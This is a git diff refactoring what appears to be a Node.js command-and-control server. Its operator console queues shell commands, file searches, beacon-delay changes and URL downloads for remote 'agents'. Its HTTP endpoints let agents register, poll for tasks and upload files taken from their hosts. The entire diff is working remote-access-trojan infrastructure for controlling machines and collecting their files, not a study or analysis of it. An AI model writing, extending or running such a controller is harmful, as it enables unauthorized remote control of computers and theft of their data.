@@ -28,31 +28,21 @@ function error(info) {
   console.log('\x1b[31m%s\x1b[0m', info);
 }
 
+function printUsage() {
+  console.log('Usage: agent list\n' +
+              '       agent <ID> cmd <command>\n' +
+              '       agent <ID> kill\n' +
+              '       agent <ID> find <name> <location>\n' +
+              '       agent <ID> delay <seconds>\n' +
+              '       agent <ID> download <url> <location>\n' +
+              '       exit\n');
+}
+
 // ---------- initialize prompt ---------- //
 
 const rl = readline.createInterface({
   input: process.stdin,
   output: process.stdout,
-  /*completer: line => {
-    const command = line.trim().split(' ');
-
-    let completions = [];
-    let commands = 'agent exit'.split(' ');
-    let agentCommands = 'list cmd disconnect find time download'.split(' ');
-
-    if (line == '') {
-      completions = commands;
-    } else if (line == 'agent') {
-      completions = agentCommands;
-    } else if (agentCommands.includes(line)) {
-      completions = Object.keys(agents);
-      console.log(completions);
-    }
-
-    const hits = completions.filter((c) => c.startsWith(line));
-    
-    return [hits.length ? hits : completions, line];
-  },*/
 });
 
 rl.setPrompt('> ');
@@ -60,82 +50,87 @@ rl.on('line', line => {
   // split line into command and arguments, filtering out empty strings
   let [cmd, ...args] = line.split(' ').filter(l => l.length != 0);
 
-  switch (cmd) {
-    case 'agent':
-      let id = args[1];
+  if (cmd == 'agent') {
+    if (args[0] == "list") {
+      listAgents();
+    } else {
+      const id = args[0];
+      const agentCmd = args[1];
 
-      switch(args[0]) {
-        case 'list':
-          listAgents();
-          break;
-
-        case 'cmd':
-          const command = args.slice(2);
-          if (id == undefined || cmd.length == 0) {
-            console.log('Usage: agent cmd <ID> <command>');
-          } else if (id in agents) {
-            sendCommand(id, command.join(' '));
-          } else {
-            error('An agent with that ID does not exist');
+      if (id == undefined || agentCmd == undefined) {
+        printUsage();
+      } else {
+        switch (agentCmd) {
+          case 'cmd': {
+            const command = args.slice(2);
+            if (id == undefined || cmd.length == 0) {
+              console.log('Usage: agent <ID> cmd <command>');
+            } else if (id in agents) {
+              sendCommand(id, command.join(' '));
+            } else {
+              error('An agent with that ID does not exist');
+            }
+            break;
           }
-          break;
 
-        case 'disconnect':
-          if (id == undefined) {
-            console.log('Usage: agent disconnect <ID>');
-          } else if (id in agents) {
-            disconnect(id);
-          } else {
-            error('An agent with that ID does not exist');
+          case 'kill': {
+            if (id == undefined) {
+              console.log('Usage: agent <ID> kill');
+            } else if (id in agents) {
+              kill(id);
+            } else {
+              error('An agent with that ID does not exist');
+            }
+            break;
           }
-          break;
 
-        case 'find':
-          const fileNames = args.slice(2);
-          if (id == undefined || fileNames.length == 0) {
-            console.log('Usage: agent find <ID> <command>');
-          } else if (id in agents) {
-            find(id, fileNames.join(' '));
-          } else {
-            error('An agent with that ID does not exist');
+          case 'find': {
+            const [name, location] = args.slice(2);
+            if (id == undefined || name == undefined || location == undefined) {
+              console.log('Usage: agent <ID> find <name> <location>');
+            } else if (id in agents) {
+              find(id, name, location);
+            } else {
+              error('An agent with that ID does not exist');
+            }
+            break;
           }
-          break;
 
-        case 'time':
-          const seconds = args[2];
-          if (id == undefined || seconds == undefined) {
-            console.log('Usage: agent find <ID> <command>');
-          } else if (id in agents) {
-            setTime(id, seconds);
-          } else {
-            error('An agent with that ID does not exist');
+          case 'delay': {
+            const seconds = args[2];
+            if (id == undefined || seconds == undefined) {
+              console.log('Usage: agent <ID> <delay>');
+            } else if (id in agents) {
+              setTime(id, parseInt(seconds, 10));
+            } else {
+              error('An agent with that ID does not exist');
+            }
+            break;
           }
-          break;
 
-        case 'download':
-          const url = args.slice(2);
-          if (id == undefined || download == undefined) {
-            console.log('Usage: agent download <ID> <url>');
-          } else if (id in agents) {
-            download(id, url);
-          } else {
-            error('An agent with that ID does not exist');
+          case 'download': {
+            const [url, location] = args.slice(2);
+            if (id == undefined || download == undefined || location == undefined) {
+              console.log('Usage: agent <ID> download <url> <location>');
+            } else if (id in agents) {
+              download(id, url, location);
+            } else {
+              error('An agent with that ID does not exist');
+            }
+            break;
           }
-          break;
 
-        default:
-          console.log('Usage: agent list\n' +
-                      '       agent cmd <ID> <command>\n' +
-                      '       agent disconnect <ID>\n' +
-                      '       agent find <ID> <command>\n' +
-                      '       agent time <ID> <seconds>\n' +
-                      '       agent download <ID> <url>\n');
+          default: {
+            printUsage();
+          }
+        }
       }
-      break;
-
-    case 'exit':
-      console.log('Shutting down server');
-      process.exit();
+    }
+  } else if (cmd == 'exit') {
+    console.log('Shutting down server');
+    process.exit();
+  } else {
+    printUsage();
   }
       
   rl.prompt();
@@ -152,27 +147,27 @@ function listAgents() {
 
 function sendCommand(id, command) {
   console.log(`Executing ${command} on agent ${id}`);
-  agents[id].queueCommand(`command&${command}`);
+  agents[id].queueCommand({ type: 'cmd', data: command });
 }
 
-function disconnect(id) {
-  console.log(`Issuing disconnect on agent ${id}`);
-  agents[id].queueCommand(`disconnect&`);
+function kill(id) {
+  console.log(`Killing agent ${id}`);
+  agents[id].queueCommand({ type: 'kill' });
 }
 
-function find(id, fileNames) {
-  console.log(`Executing find of ${fileNames} on agent ${id}`);
-  agents[id].queueCommand(`find&find ${fileNames}`);
+function find(id, name, location) {
+  console.log(`Finding files matching ${name} on agent ${id}`);
+  agents[id].queueCommand({ type: 'find', data: { name, location } });
 }
 
 function setTime(id, seconds) {
-  console.log(`Chainging wait time to ${seconds} on agent ${id}`);
-  agents[id].commands.push(`time&${seconds}`);
+  console.log(`Changing wait time to ${seconds} on agent ${id}`);
+  agents[id].queueCommand({ type: 'delay', data: seconds });
 }
 
-function download(id, url) {
-  console.log(`Told agent ${id} to download file with url ${url}`);
-  agents[id].queueCommand(`download&${url}`);
+function download(id, url, location) {
+  console.log(`Downloading ${url} to ${location} on agent ${id}`);
+  agents[id].queueCommand({ type: 'download', data: { url, location } });
 }
 
 // ---------- express endpoints ---------- //
@@ -198,14 +193,13 @@ app.post('/connect', (req, res) => {
 
   fs.writeFile(`${CLIENTS_DIRECTORY}/${agent.id}/client_info.json`, agentJson, err => {
     if (err) {
-      error("Error saving the file!");
+      error(`Error saving client info: ${err}`);
     }
   });
 
   agents[agent.id] = agent;
 
-  //res.json({ id: agent.id });
-  res.end(agent.id);
+  res.json({ id: agent.id });
 });
 
 app.post('/disconnect', (req, res) => {
@@ -232,22 +226,27 @@ app.post('/command', (req, res) => {
   }
 
   agent.lastContacted = new Date();
-  res.end(agent.getCommand());
+  res.json(agent.getCommand());
 });
 
 app.post('/upload', (req, res) => {
   const { file } = req.files;
   const { id } = req.body;
+  const filesDir = `${CLIENTS_DIRECTORY}/${id}/files`;
 
-  success(`Received file from ${id}`);
+  if (!fs.existsSync(filesDir)) {
+    fs.mkdirSync(filesDir);
+  }
 
-  file.mv(`${CLIENTS_DIRECTORY}/${id}/${file.name}`, err => {
+  file.mv(`${filesDir}/${file.name}`, err => {
     if (err) {
-      return res.status(500).send(err);
+      error(`Error receiving file from ${id}: ${err}`);
+    } else {
+      success(`Received '${file.name}' from ${id}`);
     }
-
-    res.send('File uploaded!');
   });
+
+  res.end();
 });
 
 app.post('/output', (req, res) => {
